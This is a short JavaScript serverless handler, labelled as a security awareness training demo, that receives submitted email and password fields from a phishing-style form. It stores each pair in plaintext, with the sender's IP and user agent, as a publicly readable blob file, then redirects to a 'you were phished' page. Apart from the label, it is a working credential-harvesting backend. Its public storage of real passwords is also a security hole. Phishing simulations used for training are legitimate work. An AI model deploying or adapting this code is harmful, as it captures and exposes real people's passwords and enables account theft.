// ============================================================
// SECURITY AWARENESS TRAINING DEMO
// Captures form submissions and stores them as JSON files in
// Vercel Blob so the trainer dashboard can display them.
// ============================================================

import { put } from '@vercel/blob';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body || {};

  const entry = {
    email: email || '(empty)',
    password: password || '(empty)',
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || 'unknown',
    userAgent: req.headers['user-agent'] || 'unknown'
  };

  try {
    // Build a unique filename. Timestamp + random suffix keeps order + uniqueness.
    const safeTs = entry.timestamp.replace(/[:.]/g, '-');
    const random = Math.random().toString(36).slice(2, 8);
    const filename = `captures/${safeTs}-${random}.json`;

    await put(filename, JSON.stringify(entry), {
      access: 'public',
      contentType: 'application/json',
      addRandomSuffix: false,
    });

    console.log('[TRAINING DEMO] Capture stored:', filename);
  } catch (err) {
    console.error('[TRAINING DEMO] Blob write error:', err);
  }

  // Redirect to the "you were phished" reveal page
  res.writeHead(302, { Location: '/caught.html' });
  res.end();
}
